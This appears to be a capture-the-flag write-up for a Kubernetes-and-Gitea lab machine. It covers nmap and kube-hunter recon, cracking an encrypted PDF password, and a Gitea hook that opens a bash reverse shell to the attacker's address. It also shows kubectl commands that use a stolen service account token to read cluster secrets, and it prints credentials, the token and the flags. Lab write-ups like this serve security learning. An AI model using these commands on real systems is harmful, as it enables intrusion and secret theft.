# PalsForLife
2021-10-01
IP = 10.10.23.193

## Initial info
Are you able to compromise this World Of Warcraft themed machine?


## Recon

### Nmap
```
nmap -p22,6443,10250,30180,31111,31112 -sV -sC -T4 -Pn -oA 10.10.23.193 10.10.23.193
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-01 14:08 EDT
Verbosity Increased to 1.
Completed Service scan at 14:09, 101.32s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.23.193.
Initiating NSE at 14:09
Completed NSE at 14:09, 5.25s elapsed
Initiating NSE at 14:09
Completed NSE at 14:09, 1.23s elapsed
Initiating NSE at 14:09
Completed NSE at 14:09, 0.00s elapsed
Nmap scan report for 10.10.23.193
Host is up (0.11s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c9:f7:dd:3d:79:bb:f8:44:0f:bd:87:bd:8b:af:e1:5a (RSA)
|   256 4c:48:9d:c6:b4:e2:17:99:76:48:20:fe:96:d2:c8:eb (ECDSA)
|_  256 d8:e2:f7:ac:4d:cd:68:66:d7:a9:64:1c:42:4a:8e:30 (ED25519)
6443/tcp  open  ssl/sun-sr-https?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Fri, 01 Oct 2021 18:08:49 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Fri, 01 Oct 2021 18:08:20 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, IP Address:10.10.23.193, IP Address:10.43.0.1, IP Address:127.0.0.1, IP Address:172.30.18.136, IP Address:192.168.1.244
| Issuer: commonName=k3s-server-ca@1622498168
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2021-05-31T21:56:08
| Not valid after:  2022-10-01T18:04:52
| MD5:   f651 e13e 15c3 b1f2 fdbc 43f7 ed17 d516
|_SHA-1: 79d0 94b7 4b20 a3f2 4e33 9f22 1e8f 3e06 82fd 10d3
10250/tcp open  ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=palsforlife
| Subject Alternative Name: DNS:palsforlife, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.23.193
| Issuer: commonName=k3s-server-ca@1622498168
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2021-05-31T21:56:08
| Not valid after:  2022-10-01T18:04:02
| MD5:   223b 10a2 1549 f769 2740 052f 9bc7 ec85
|_SHA-1: 92fa 75db 5a9e b721 138c 1b6a 1a36 586a b2d2 5c00
30180/tcp open  http              nginx 1.21.0
|_http-title: 403 Forbidden
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.21.0
31111/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=a888c930c2671e29; Path=/; HttpOnly
|     Set-Cookie: _csrf=roHYLiHU5H_kM6ICR5BnXnrLcx06MTYzMzExMTY5MzU4OTEzMjk3OQ%3D%3D; Path=/; Expires=Sat, 02 Oct 2021 18:08:13 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 01 Oct 2021 18:08:13 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
|     <meta name="keywords" content="go,git,self-hosted,gitea
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=9ae634bf89db79e0; Path=/; HttpOnly
|     Set-Cookie: _csrf=s2DkT-bBJRExM9bO682OUIRbAag6MTYzMzExMTY5Mzg0NzQyNTA4MQ%3D%3D; Path=/; Expires=Sat, 02 Oct 2021 18:08:13 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 01 Oct 2021 18:08:13 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
|_    <meta name="keywords" content="
31112/tcp open  ssh               OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 2b:c6:63:84:93:b8:04:ce:1c:f5:ce:c7:0e:ca:eb:28 (RSA)
|   256 93:6b:41:5f:89:14:97:0c:6b:53:ab:ba:af:71:f1:40 (ECDSA)
|_  256 e8:c4:94:7b:72:d7:4c:1c:bd:51:4a:84:81:4b:68:c9 (ED25519)
```
- 22: SSH
- 6443: https api server
- 10250: Golang http server
- 30180: nginx forbidden http
- 31111: gitea
- 31112: SSH (again?)

### Kube-hunter
```
nodes
+-------------+--------------+
| TYPE        | LOCATION     |
+-------------+--------------+
| Node/Master | 10.10.23.193 |
+-------------+--------------+

Detected Services
+----------------------+--------------------+----------------------+
| SERVICE              | LOCATION           | DESCRIPTION          |
+----------------------+--------------------+----------------------+
| Unrecognized K8s API | 10.10.23.193:6443  | A Kubernetes API     |
|                      |                    | service              |
+----------------------+--------------------+----------------------+
| Kubelet API          | 10.10.23.193:10250 | The Kubelet is the   |
|                      |                    | main component in    |
|                      |                    | every Node, all pod  |
|                      |                    | operations goes      |
|                      |                    | through the kubelet  |
+----------------------+--------------------+----------------------+
```

### Feroxbuster
http://10.10.23.193:30180/team/
## Findings
### Gitea

### IP:30180/team/
In the source code we get a big b64 encoded string which decodes to a pdf that's encrypted

Running pdf2john on the file to get a hash and then johntheripper on the hash gets us `I_am_geniu5_P4ladin#`

## Exploits

### Gitea
We can create a new post-hook that runs `bash -i >& /dev/tcp/10.6.66.15/1337 0>&1 ` and listen to the port with `pwncat`

### kubectl

From the k8s account token below we can run `kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 auth can-i --list`

```
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

Then we can get the second flag with `kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://team.thm:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'
`



## Crendentials
leeroy@jenki.ns - `I_am_geniu5_P4ladin#` gitea

k8s service account token: 
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w
```


### Potential users
leeroy (gitea) - leeroy@jenki.ns
### User:Pass

## Flags
Flag 1: `flag{Stick_to_the_plan!}` from the webhook page. It's the secret.

Flag 2: `flag{_G0ddamit_Leeroy_}` in /root

Flag 3: `flag{Its_n0t_my_fault!}` see kubectl exploit

Flag 4: `flag{At_least_i_have_chicken}`
